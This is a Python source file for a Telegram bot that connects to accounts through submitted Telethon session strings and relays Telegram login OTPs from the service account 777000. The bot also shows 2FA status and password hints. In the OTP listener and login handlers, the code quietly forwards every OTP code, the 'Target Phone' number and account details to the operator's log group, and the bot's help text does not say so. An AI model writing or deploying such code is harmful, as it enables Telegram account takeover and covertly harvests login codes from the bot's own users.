import re
import asyncio
from datetime import datetime, timezone, timedelta
from aiohttp import web
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.tl.functions.account import GetPasswordRequest
from config import (
    API_ID,
    API_HASH,
    BOT_TOKEN,
    OWNER_ID,
    LOG_GROUP_ID,
    START_IMG,
    UPDATE_URL,
    SUPPORT_URL,
    PORT,
)

# Python 3.14 fix: TelegramClient initialize karne se pehle event loop set karein
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

bot = TelegramClient("autoview_otp_bot", API_ID, API_HASH, loop=loop)
active_clients = {}
IST = timezone(timedelta(hours=5, minutes=30))


def now_ist() -> str:
    return datetime.now(IST).strftime("%d %b %Y, %I:%M:%S %p IST")


async def send_log(text: str):
    """Log group me activity ya error bhejta hai."""
    if not LOG_GROUP_ID:
        return
    try:
        await bot.send_message(LOG_GROUP_ID, text)
    except Exception as exc:
        print(f"Log group send failed: {exc}")


def extract_otp(text: str):
    if not text:
        return None
    match = re.search(r"\b(\d{5})\b", text)
    return match.group(1) if match else None


def main_menu_buttons():
    return [
        [
            Button.inline("✦ ʜᴇʟᴘ ᴍᴇɴᴜ", b"open_help"),
            Button.inline("◈ ꜰᴜʟʟ ɢᴜɪᴅᴇ", b"open_guide"),
        ],
        [
            Button.url("🔕 ᴜᴘᴅᴀᴛᴇ", UPDATE_URL),
            Button.url("💌 ꜱᴜᴘᴘᴏʀᴛ", SUPPORT_URL),
        ],
    ]


def back_to_start_buttons():
    return [
        [
            Button.inline("✦ ʜᴇʟᴘ", b"open_help"),
            Button.inline("◈ ɢᴜɪᴅᴇ", b"open_guide"),
        ],
        [
            Button.inline("◀ ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ", b"back_start"),
        ],
    ]


START_CAPTION = (
    "✦ **ᴀᴜᴛᴏᴠɪᴇᴡ ꜱᴇꜱꜱɪᴏɴ ʟᴏɢɪɴ ʙᴏᴛ** ✦\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "ᴀᴘɴɪ ᴛᴇʟᴇᴛʜᴏɴ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ ꜱᴇ ᴀᴄᴄᴏᴜɴᴛ\n"
    "ᴄᴏɴɴᴇᴄᴛ ᴋᴀʀᴇɪɴ ᴀᴜʀ ʀᴇᴀʟ-ᴛɪᴍᴇ ᴏᴛᴘ ᴘʀᴀᴘᴛ ᴋᴀʀᴇɪɴ.\n\n"
    "▸ **ꜱᴛᴀᴛᴜꜱ:** `ᴏɴʟɪɴᴇ & ʀᴇᴀᴅʏ`\n"
    "▸ **ᴏᴡɴᴇʀ:** @CoderNova\n"
    "▸ **ᴍᴏᴅᴇ:** `ᴅᴀᴛᴀʙᴀꜱᴇ-ꜰʀᴇᴇ / ꜰᴀꜱᴛ`\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ʙᴜᴛᴛᴏɴꜱ ꜱᴇ **ʜᴇʟᴘ** ʏᴀ **ɢᴜɪᴅᴇ** ᴏᴘᴇɴ ᴋᴀʀᴇɪɴ."
)

HELP_TEXT = (
    "✦ **ᴀᴜᴛᴏᴠɪᴇᴡ — ʜᴇʟᴘ & ᴄᴏᴍᴍᴀɴᴅꜱ** ✦\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "• `/start` — ʙᴏᴛ ᴍᴇɴᴜ ᴀᴜʀ ꜱᴛᴀᴛᴜꜱ ᴅᴇᴋʜᴇɪɴ\n"
    "• `/login <string>` — ꜱᴇꜱꜱɪᴏɴ ꜱᴇ ᴄᴏɴɴᴇᴄᴛ ᴋᴀʀᴇɪɴ\n"
    "• `/otp` — `777000` ꜱᴇ ʟᴀᴛᴇꜱᴛ ᴏᴛᴘ / ᴍᴇꜱꜱᴀɢᴇ ɴɪᴋᴀʟᴇɪɴ\n"
    "• `/check` — 2ꜰᴀ ꜱᴛᴀᴛᴜꜱ ᴀᴜʀ ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ ᴅᴇᴋʜᴇɪɴ\n"
    "• `/logout` — ᴀᴄᴛɪᴠᴇ ꜱᴇꜱꜱɪᴏɴ ᴅɪꜱᴄᴏɴɴᴇᴄᴛ ᴋᴀʀᴇɪɴ\n"
    "• `/help` — ᴄᴏᴍᴍᴀɴᴅꜱ ʟɪꜱᴛ ᴅᴇᴋʜᴇɪɴ\n"
    "• `/guide` — ᴘᴜʀᴀ ꜱᴛᴇᴘ-ʙʏ-ꜱᴛᴇᴘ ɢᴜɪᴅᴇ ᴘᴀᴅʜᴇɪɴ\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "💡 *ɴᴏᴛᴇ:* 2ꜰᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ᴛᴇʟᴇɢʀᴀᴍ ꜱᴇ ꜰᴇᴛᴄʜ ɴᴀʜɪ ʜᴏᴛᴀ."
)

GUIDE_TEXT = (
    "◈ **ꜱᴛᴇᴘ-ʙʏ-ꜱᴛᴇᴘ ʟᴏɢɪɴ & ᴏᴛᴘ ɢᴜɪᴅᴇ** ◈\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "**1.** `/login <your_telethon_string>` ʙʜᴇᴊᴇɪɴ.\n"
    "**2.** ʙᴏᴛ ᴀᴄᴄᴏᴜɴᴛ ᴋᴀ **ɴᴀᴍᴇ** ᴀᴜʀ **ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ** ᴅᴇɢᴀ.\n"
    "**3.** ᴛᴇʟᴇɢʀᴀᴍ ᴀᴘᴘ ʏᴀ ᴡᴇʙ ᴍᴇ ᴡᴏ ɴᴜᴍʙᴇʀ ᴅᴀʟᴇɪɴ.\n"
    "**4.** ɴᴀʏᴀ ᴏᴛᴘ ᴀᴀᴛᴇ ʜɪ ʙᴏᴛ ʙʜᴇᴊ ᴅᴇɢᴀ, ʏᴀ `/otp` ᴅᴀʙᴀᴋᴀʀ\n"
    "    `777000` ꜱᴇ ʟᴀᴛᴇꜱᴛ ᴍᴇꜱꜱᴀɢᴇ ᴘᴀᴅʜ ꜱᴀᴋᴛᴇ ʜᴀɪɴ.\n"
    "**5.** `/check` ꜱᴇ ᴅᴇᴋʜ ꜱᴀᴋᴛᴇ ʜᴀɪɴ ᴋɪ 2ꜰᴀ ᴏɴ ʜᴀɪ ʏᴀ ɴᴀʜɪ.\n"
    "**6.** ᴋᴀᴀᴍ ʜᴏɴᴇ ᴋᴇ ʙᴀᴀᴅ `/logout` ᴋᴀʀᴇɪɴ.\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "⚠️ *ɴᴏᴛᴇ:* 2ꜰᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ᴋʜᴜᴅ ᴅᴀʟɴᴀ ʜᴏɢᴀ."
)


async def health_handler(request):
    return web.Response(text="OK - AutoView OTP Bot Alive", status=200)


async def start_web_server():
    app = web.Application()
    app.router.add_get("/", health_handler)
    app.router.add_get("/health", health_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    print(f"Web server listening on port {PORT}")


@bot.on(events.NewMessage(pattern=r"^/start(?:@\w+)?$"))
async def start_handler(event):
    sender = await event.get_sender()
    uname = f"@{sender.username}" if sender and sender.username else "No Username"
    await event.respond(
        START_CAPTION,
        file=START_IMG,
        buttons=main_menu_buttons(),
    )
    await send_log(
        f"🟢 **#START**\n"
        f"• **User:** `{event.sender_id}` ({uname})\n"
        f"• **Time:** `{now_ist()}`"
    )


@bot.on(events.NewMessage(pattern=r"^/help(?:@\w+)?$"))
async def help_handler(event):
    await event.reply(HELP_TEXT, buttons=back_to_start_buttons())


@bot.on(events.NewMessage(pattern=r"^/guide(?:@\w+)?$"))
async def guide_handler(event):
    await event.reply(GUIDE_TEXT, buttons=back_to_start_buttons())


@bot.on(events.CallbackQuery(data=b"open_help"))
async def cb_help(event):
    await event.edit(HELP_TEXT, buttons=back_to_start_buttons())


@bot.on(events.CallbackQuery(data=b"open_guide"))
async def cb_guide(event):
    await event.edit(GUIDE_TEXT, buttons=back_to_start_buttons())


@bot.on(events.CallbackQuery(data=b"back_start"))
async def cb_back_start(event):
    await event.delete()
    await event.respond(
        START_CAPTION,
        file=START_IMG,
        buttons=main_menu_buttons(),
    )


@bot.on(events.NewMessage(pattern=r"^/login(?:@\w+)?(?:\s+(.+))?", func=lambda e: e.is_private))
async def login_handler(event):
    user_id = event.sender_id
    sender = await event.get_sender()
    uname = f"@{sender.username}" if sender and sender.username else "No Username"
    session_str = event.pattern_match.group(1)

    if not session_str:
        return await event.reply(
            "❌ **ᴜꜱᴀɢᴇ:** `/login <aapki_telethon_string>`\n\n"
            "ᴘᴜʀɪ ᴊᴀɴᴋᴀʀɪ ᴋᴇ ʟɪʏᴇ `/guide` ᴄʜᴇᴄᴋ ᴋᴀʀᴇɪɴ."
        )

    session_str = session_str.strip()
    status_msg = await event.reply("⏳ **ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ ʜᴏ ʀᴀʜᴀ ʜᴀɪ...**")

    if user_id in active_clients:
        try:
            await active_clients[user_id].disconnect()
        except Exception:
            pass
        del active_clients[user_id]

    try:
        user_client = TelegramClient(StringSession(session_str), API_ID, API_HASH, loop=loop)
        await user_client.connect()

        if not await user_client.is_user_authorized():
            await user_client.disconnect()
            await status_msg.edit("❌ **ʏᴇʜ ꜱᴇꜱꜱɪᴏɴ ꜱᴛʀɪɴɢ ɪɴᴠᴀʟɪᴅ ʏᴀ ᴇxᴘɪʀᴇᴅ ʜᴀɪ.**")
            await send_log(
                f"⚠️ **#LOGIN_FAILED**\n"
                f"• **User:** `{user_id}` ({uname})\n"
                f"• **Reason:** Unauthorized / Expired string\n"
                f"• **Time:** `{now_ist()}`"
            )
            return

        me = await user_client.get_me()
        active_clients[user_id] = user_client

        @user_client.on(events.NewMessage(from_users=777000))
        async def otp_listener(otp_event):
            raw_msg = otp_event.raw_text or ""
            code = extract_otp(raw_msg)
            if code:
                await bot.send_message(
                    user_id,
                    f"📩 **ɴᴀʏᴀ ᴛᴇʟᴇɢʀᴀᴍ ᴏᴛᴘ ᴀᴀʏᴀ ʜᴀɪ!**\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🔑 **ʟᴏɢɪɴ ᴄᴏᴅᴇ:** `{code}`\n"
                    f"📱 **ᴀᴄᴄᴏᴜɴᴛ:** `+{me.phone}`\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📝 **ᴍᴇꜱꜱᴀɢᴇ:**\n{raw_msg}",
                )
                await send_log(
                    f"🔑 **#OTP_DELIVERED**\n"
                    f"• **User:** `{user_id}` ({uname})\n"
                    f"• **Target Phone:** `+{me.phone}`\n"
                    f"• **OTP Code:** `{code}`\n"
                    f"• **Time:** `{now_ist()}`"
                )
            else:
                await bot.send_message(
                    user_id,
                    f"📩 **ᴛᴇʟᴇɢʀᴀᴍ (777000) ᴍᴇꜱꜱᴀɢᴇ:**\n\n{raw_msg}",
                )

        await status_msg.edit(
            f"✅ **ꜱᴇꜱꜱɪᴏɴ ᴀᴄᴛɪᴠᴇ (ʟᴏɢɪɴ ʀᴇᴀᴅʏ)!**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 **ᴀᴄᴄᴏᴜɴᴛ:** {me.first_name or 'User'}\n"
            f"📱 **ᴘʜᴏɴᴇ:** `+{me.phone}`\n"
            f"🆔 **ᴜꜱᴇʀ ɪᴅ:** `{me.id}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👉 ᴀᴘɴᴇ ᴛᴇʟᴇɢʀᴀᴍ ᴍᴇ `+{me.phone}` ɴᴜᴍʙᴇʀ ᴅᴀʟᴇɪɴ.\n"
            f"• ɴᴀʏᴀ ᴏᴛᴘ ᴀᴀᴛᴇ ʜɪ ʙᴏᴛ ʙʜᴇᴊ ᴅᴇɢᴀ.\n"
            f"• ᴘᴜʀᴀɴᴀ/ʟᴀᴛᴇꜱᴛ ᴏᴛᴘ ᴅᴇᴋʜɴᴇ ᴋᴇ ʟɪʏᴇ `/otp` ᴅᴀʙᴀʏᴇɪɴ."
        )

        await send_log(
            f"✅ **#LOGIN_SUCCESS**\n"
            f"• **User:** `{user_id}` ({uname})\n"
            f"• **Logged Account:** `{me.first_name}` (`+{me.phone}`, ID: `{me.id}`)\n"
            f"• **Time:** `{now_ist()}`"
        )

    except Exception as exc:
        await status_msg.edit(f"❌ **ᴇʀʀᴏʀ:** `{str(exc)}`")
        await send_log(
            f"🚨 **#LOGIN_ERROR**\n"
            f"• **User:** `{user_id}` ({uname})\n"
            f"• **Error:** `{str(exc)}`\n"
            f"• **Time:** `{now_ist()}`"
        )


@bot.on(events.NewMessage(pattern=r"^/otp(?:@\w+)?$", func=lambda e: e.is_private))
async def fetch_otp_handler(event):
    user_id = event.sender_id
    client = active_clients.get(user_id)
    if not client:
        return await event.reply("❌ **ᴘᴇʜʟᴇ `/login <string>` ꜱᴇ ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ ᴋᴀʀᴇɪɴ.**")

    try:
        messages = await client.get_messages(777000, limit=1)
        if not messages:
            return await event.reply("ℹ️ **777000 ꜱᴇ ᴋᴏɪ ᴍᴇꜱꜱᴀɢᴇ ɴᴀʜɪ ᴍɪʟᴀ.**")

        msg = messages[0]
        raw_text = msg.raw_text or ""
        code = extract_otp(raw_text)
        msg_time = msg.date.astimezone(IST).strftime("%d %b %Y, %I:%M:%S %p IST")

        if code:
            await event.reply(
                f"🔑 **ʟᴀᴛᴇꜱᴛ ᴛᴇʟᴇɢʀᴀᴍ ᴏᴛᴘ**\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"• **OTP Code:** `{code}`\n"
                f"• **Message Time:** `{msg_time}`\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{raw_text}"
            )
        else:
            await event.reply(
                f"📩 **777000 ʟᴀᴛᴇꜱᴛ ᴍᴇꜱꜱᴀɢᴇ** (`{msg_time}`):\n\n{raw_text}"
            )
    except Exception as exc:
        await event.reply(f"❌ **ᴏᴛᴘ ꜰᴇᴛᴄʜ ᴇʀʀᴏʀ:** `{str(exc)}`")


@bot.on(events.NewMessage(pattern=r"^/check(?:@\w+)?$", func=lambda e: e.is_private))
async def check_account_handler(event):
    user_id = event.sender_id
    client = active_clients.get(user_id)
    if not client:
        return await event.reply("❌ **ᴘᴇʜʟᴇ `/login <string>` ꜱᴇ ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ ᴋᴀʀᴇɪɴ.**")

    try:
        me = await client.get_me()
        pwd_info = await client(GetPasswordRequest())
        has_2fa = "Enabled (Password required)" if pwd_info.has_password else "Disabled"
        hint = pwd_info.hint if pwd_info.hint else "None"

        await event.reply(
            f"📋 **ᴀᴄᴄᴏᴜɴᴛ ꜱᴛᴀᴛᴜꜱ**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"• **Name:** {me.first_name or ''} {me.last_name or ''}\n"
            f"• **Phone:** `+{me.phone}`\n"
            f"• **User ID:** `{me.id}`\n"
            f"• **2FA Status:** `{has_2fa}`\n"
            f"• **2FA Hint:** `{hint}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚠️ *2FA password khud se fetch nahi ho sakta.*"
        )
    except Exception as exc:
        await event.reply(f"❌ **ᴄʜᴇᴄᴋ ᴇʀʀᴏʀ:** `{str(exc)}`")


@bot.on(events.NewMessage(pattern=r"^/logout(?:@\w+)?$", func=lambda e: e.is_private))
async def logout_handler(event):
    user_id = event.sender_id
    sender = await event.get_sender()
    uname = f"@{sender.username}" if sender and sender.username else "No Username"

    if user_id in active_clients:
        try:
            await active_clients[user_id].disconnect()
        except Exception:
            pass
        del active_clients[user_id]
        await event.reply("✅ **ꜱᴇꜱꜱɪᴏɴ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴅɪꜱᴄᴏɴɴᴇᴄᴛ ʜᴏ ɢᴀʏᴀ ʜᴀɪ.**")
        await send_log(
            f"🔴 **#LOGOUT**\n"
            f"• **User:** `{user_id}` ({uname})\n"
            f"• **Time:** `{now_ist()}`"
        )
    else:
        await event.reply("ℹ️ **ᴀʙʜɪ ᴀᴀᴘᴋᴀ ᴋᴏɪ ꜱᴇꜱꜱɪᴏɴ ᴀᴄᴛɪᴠᴇ ɴᴀʜɪ ʜᴀɪ.**")


async def main():
    await start_web_server()
    await bot.start(bot_token=BOT_TOKEN)
    print("@AutoView_all_bot started successfully.")
    await send_log(
        f"🚀 **#BOT_ONLINE**\n"
        f"• **Bot:** `@AutoView_all_bot`\n"
        f"• **Owner:** `@CoderNova` (`{OWNER_ID}`)\n"
        f"• **Time:** `{now_ist()}`"
    )
    await bot.run_until_disconnected()


if __name__ == "__main__":
    loop.run_until_complete(main())
